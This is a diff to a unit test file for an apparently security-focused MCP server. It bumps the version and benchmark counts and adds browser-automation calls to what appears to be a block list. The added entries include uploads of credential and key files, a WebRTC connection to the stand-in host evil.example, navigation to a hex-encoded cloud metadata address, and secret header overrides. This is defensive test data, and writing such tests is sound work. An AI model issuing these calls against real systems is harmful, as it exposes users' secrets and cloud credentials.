@@ -250,7 +250,7 @@ class TestJevCognitiveMcp(unittest.TestCase):
     def test_mcp_server_protocol_handlers(self):
         init_resp = handle_mcp_request({"jsonrpc": "2.0", "id": 1, "method": "initialize"})
         self.assertEqual(init_resp["result"]["serverInfo"]["name"], "jev-cognitive-mcp")
-        self.assertEqual(init_resp["result"]["serverInfo"]["version"], "0.4.8")
+        self.assertEqual(init_resp["result"]["serverInfo"]["version"], "0.4.9")
 
         tools_resp = handle_mcp_request({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
         tool_names = {t["name"] for t in tools_resp["result"]["tools"]}
@@ -310,8 +310,8 @@ class TestJevCognitiveMcp(unittest.TestCase):
         self.assertEqual(repo_corpus.read_bytes(), pkg_corpus.read_bytes())
 
         summary = run_layer0_benchmark("benchmarks/layer0_corpus.jsonl")
-        self.assertEqual(summary["total"], 95)
-        self.assertEqual(summary["matched"], 95)
+        self.assertEqual(summary["total"], 100)
+        self.assertEqual(summary["matched"], 100)
         self.assertEqual(summary["accuracy"], 1.0)
         self.assertEqual(summary["mismatches"], [])
 
@@ -744,6 +744,14 @@ class TestJevCognitiveMcp(unittest.TestCase):
                     ("DOM.setFileInputFiles", {"files": ["/home/alice/.vault-token", "/home/alice/.cargo/credentials.toml"]}),
                     ("Browser.setDownloadBehavior", {"behavior": "allow", "downloadPath": "/home/alice/.codex"}),
                     ("Network.setExtraHTTPHeaders", {"headers": {"X-Goog-Api-Key": "internal-key-override"}}),
+                    ("HeapProfiler.takeHeapSnapshot", {"reportProgress": False}),
+                    ("DOMSnapshot.captureSnapshot", {"computedStyles": []}),
+                    ("FedCm.selectAccount", {"dialogId": "dlg-1", "accountIndex": 0}),
+                    ("Runtime.evaluate", {"expression": "new RTCPeerConnection({iceServers:[{urls:'stun:evil.example:3478'}]})"}),
+                    ("Page.navigate", {"url": "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/"}),
+                    ("Target.createTarget", {"url": "chrome://local-state"}),
+                    ("DOM.setFileInputFiles", {"files": ["/home/alice/.pgpass", "/home/alice/.config/sops/age/keys.txt"]}),
+                    ("Network.setExtraHTTPHeaders", {"headers": {"CF-Access-Client-Secret": "zero-trust-override"}}),
                 ],
                 start=29,
             ):
